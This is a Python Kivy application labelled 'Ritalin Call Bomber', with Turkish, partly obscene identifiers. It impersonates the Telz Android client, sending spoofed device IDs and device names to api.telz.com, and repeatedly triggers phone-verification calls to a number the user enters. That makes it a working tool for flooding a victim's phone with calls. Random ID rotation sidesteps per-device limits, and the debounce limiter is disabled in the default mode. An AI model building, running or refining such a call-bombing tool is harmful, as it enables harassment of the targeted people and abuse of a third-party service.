import requests
import os
os.environ['KIVY_GL_BACKEND'] = 'sdl2'
from io import BytesIO
from kivy.app import App
from kivy.uix.behaviors import ButtonBehavior
from kivy.uix.image import Image
from kivy.uix.boxlayout import BoxLayout
from kivy.uix.textinput import TextInput
from kivy.uix.label import Label
from kivy.clock import mainthread
from threading import Thread
from kivy.core.image import Image as CoreImage
from kivy.graphics import Color, RoundedRectangle
import json, time, uuid
from threading import Lock
MODE = "TEST_RANDOM_IDS"
GOKU = 300
class AnaninAmi(ButtonBehavior, Image):
    pass
class RitalinHekir(BoxLayout):
    def __init__(self, **kwargs):
        super().__init__(**kwargs)
        self.padding = 5
        self.spacing = 5
        with self.canvas.before:
            Color(0.1, 0.1, 0.4, 1)
            self.rect = RoundedRectangle(radius=[20])
        self.bind(pos=self.Kakarotto, size=self.Kakarotto)    
    def Kakarotto(self, *args):
        self.rect.pos = self.pos
        self.rect.size = self.size
class AraBeniAskim:
    def __init__(self, SutyenAvcisi=300):
        self.SutyenAvcisi = float(SutyenAvcisi)
        self.BeyondLimit = {}
        self.lock = Lock()    
    def HopOffUniverse(self, SutyenAvcisi):
        ozgurSuriyeOrdusu = time.time()
        with self.lock:
            memeFaliBakilir = self.BeyondLimit.get(SutyenAvcisi)
            if memeFaliBakilir is None or (ozgurSuriyeOrdusu - memeFaliBakilir) >= self.SutyenAvcisi:
                self.BeyondLimit[SutyenAvcisi] = ozgurSuriyeOrdusu
                return True
            else:
                return False
limiter = AraBeniAskim(SutyenAvcisi=GOKU)
class TelzIstemci:
    temelurl = "https://api.telz.com/"
    basliklar = {
        'User-Agent': "Telz-Android/17.5.33",
        'Accept-Encoding': "gzip",
        'Content-Type': "application/json; charset=UTF-8"
    }    
    def __init__(self, SutyenAvcisi=None, memeFaliBakilir="17.5.33", ozgurSuriyeOrdusu="android", BeyondLimit="15"):
        if MODE == "TEST_RANDOM_IDS" and SutyenAvcisi is None:
            SutyenAvcisi = self.randomAndroidId()
        self.memeFaliBakilir = SutyenAvcisi or "13e50e93a6399e67"
        self.SutyenAvcisi = memeFaliBakilir
        self.ozgurSuriyeOrdusu = ozgurSuriyeOrdusu
        self.BeyondLimit = BeyondLimit
        self.rito4 = str(uuid.uuid4())
        self.rito5 = requests.Session()    
    @staticmethod
    def randomAndroidId():
        return uuid.uuid4().hex[:16]    
    @staticmethod
    def randomCihazAdi():
        rito = ["Pixel", "Xiaomi", "Samsung", "OnePlus", "Moto"]
        return f"{rito[int(uuid.uuid4().int % len(rito))]}-{uuid.uuid4().hex[:6]}"    
    def gonder(self, SutyenAvcisi, memeFaliBakilir, ozgurSuriyeOrdusu=10.0):
        BeyondLimit = self.temelurl + SutyenAvcisi
        memeFaliBakilir = memeFaliBakilir.copy()
        memeFaliBakilir.update({
            "android_id": self.memeFaliBakilir,
            "app_version": self.SutyenAvcisi,
            "os": self.ozgurSuriyeOrdusu,
            "os_version": self.BeyondLimit,
            "ts": int(time.time() * 1000),
            "uuid": self.rito4
        })
        SutyenAvcisi = self.rito5.post(BeyondLimit, data=json.dumps(memeFaliBakilir), headers=self.basliklar, timeout=ozgurSuriyeOrdusu)
        if SutyenAvcisi.status_code == 429:
            memeFaliBakilir = SutyenAvcisi.headers.get("Retry-After", "?")
            raise RuntimeError(f"Fazla deneme: {memeFaliBakilir} saniye sonra tekrar dene")
        SutyenAvcisi.raise_for_status()
        try:
            return SutyenAvcisi.json()
        except ValueError:
            return SutyenAvcisi.text    
    def kimlikListesi(self):
        return self.gonder("app/auth_list", {"event": "auth_list"})    
    def calistir(self, SutyenAvcisi=None, memeFaliBakilir="10.1.10.1", ozgurSuriyeOrdusu="FE80::1", BeyondLimit="tr"):
        SutyenAvcisi = SutyenAvcisi or (self.randomCihazAdi() if MODE == "TEST_RANDOM_IDS" else "Xiaomi 2311DRK48G")
        return self.gonder("app/run", {
            "event": "run",
            "device_name": SutyenAvcisi,
            "ipv4_address": memeFaliBakilir,
            "ipv6_address": ozgurSuriyeOrdusu,
            "lang": BeyondLimit,
            "network_country": "tr",
            "network_type": "4G",
            "roaming": "no",
            "root": "no",
            "run_id": "",
            "sim_country": "tr"
        })    
    def butonDurum(self, SutyenAvcisi="on_reg_continue"):
        return self.gonder("app/stat_btns", {"event": "stat_btns", "btn": SutyenAvcisi})    
    def numaraDogrula(self, memeFaliBakilir, SutyenAvcisi="TR"):
        return self.gonder("app/validate_phonenumber", {"event": "validate_phonenumber", "phone": memeFaliBakilir, "region": SutyenAvcisi})    
    def aramaDogrula(self, memeFaliBakilir, ozgurSuriyeOrdusu="0", BeyondLimit="tr"):
        if MODE == "DEBOUNCE" and not limiter.HopOffUniverse(memeFaliBakilir):
            raise RuntimeError(f"Bu numaraya kısa süre önce arama atıldı. Lütfen {GOKU} saniye sonra tekrar deneyin!")
        return self.gonder("app/auth_call", {"event": "auth_call", "phone": memeFaliBakilir, "attempt": ozgurSuriyeOrdusu, "lang": BeyondLimit})    
    def aramaCevap(self, memeFaliBakilir, SutyenAvcisi=True):
        return self.gonder("app/auth_call_response", {"event": "auth_call_response", "phone": memeFaliBakilir, "success": bool(SutyenAvcisi)})    
    def safetyv2(self, SutyenAvcisi: dict):
        SutyenAvcisi = SutyenAvcisi.copy()
        SutyenAvcisi.setdefault("event", "safety_v2")
        return self.gonder("app/safety_v2", SutyenAvcisi)
class SuperSaiyan(App):
    def build(self):
        root = BoxLayout(orientation="vertical", padding=10, spacing=10)                
        url = "https://i.ibb.co/yn54tj7y/MG-20260326-004137.jpg"
        yanit = requests.get(url)
        data = BytesIO(yanit.content)
        core = CoreImage(data, ext="webp")
        img = Image()
        img.texture = core.texture
        img.size_hint = (1, 0.5)
        root.add_widget(img)                
        self.baslik_label = Label(
            text="Ritalin Call Bomber",
            size_hint=(1, 0.1),
            font_size='20sp',
            bold=True,
            color=(1, 1, 1, 1)
        )
        root.add_widget(self.baslik_label)              
        hbox = RitalinHekir(orientation="horizontal", size_hint=(0.9, 0.15), pos_hint={"center_x": 0.5, "y": 0.65})
        self.tel_input = TextInput(
            hint_text="Numara Gir (örn: +90XXXXXXXXX)",
            foreground_color=(1, 1, 1, 1),
            background_color=(0.1, 0.1, 0.4, 1),
            multiline=False
        )
        hbox.add_widget(self.tel_input)        
        ButonResim = "https://i.ibb.co/Hpx6T49S/Polish-20260423-004613573.png"
        res = requests.get(ButonResim)
        data_btn = BytesIO(res.content)
        core_btn = CoreImage(data_btn, ext="png")
        btn_img = AnaninAmi()
        btn_img.texture = core_btn.texture
        btn_img.size_hint = (0.3, 1)
        btn_img.bind(on_release=self.WallahDe)
        hbox.add_widget(btn_img)
        root.add_widget(hbox)                
        self.status_label = Label(text="", size_hint=(1, 0.1))
        root.add_widget(self.status_label)        
        return root    
    def WallahDe(self, instance):
        telno = self.tel_input.text.strip()
        if not telno:
            self.tamamknk("Numara gir yarram", "red")
            return                        
        thread = Thread(target=self.tamamsensin, args=(telno,))
        thread.start()    
    def tamamsensin(self, hedeftelno):
        try:
            self.tamamknk("İstek atiliyor..", "yellow")                        
            istemci = TelzIstemci(SutyenAvcisi=None if MODE == "TEST_RANDOM_IDS" else "13e50e93a6399e67")                        
            istemci.kimlikListesi()
            istemci.calistir()
            istemci.butonDurum()
            istemci.numaraDogrula(hedeftelno)
            sonuc = istemci.aramaDogrula(hedeftelno)            
            self.tamamknk("Arama Gönderildi", "green")                        
            for i in range(5):
                time.sleep(20)
                sonuc = istemci.aramaDogrula(hedeftelno)
                self.tamamknk(f"Arama #{i+2} Gönderildi", "green")            
        except Exception as yrk:
            self.tamamknk(f"Hata: {str(yrk)[:50]}", "red")    
    @mainthread
    def tamamknk(self, mesaj, renk_str="red"):
        self.status_label.text = mesaj
        if renk_str == "red":
            self.status_label.color = (1, 0, 0, 1)
        elif renk_str == "green":
            self.status_label.color = (0, 1, 0, 1)
        elif renk_str == "yellow":
            self.status_label.color = (1, 1, 0, 1)
        else:
            self.status_label.color = (1, 1, 1, 1)
if __name__ == "__main__":
    SuperSaiyan().run()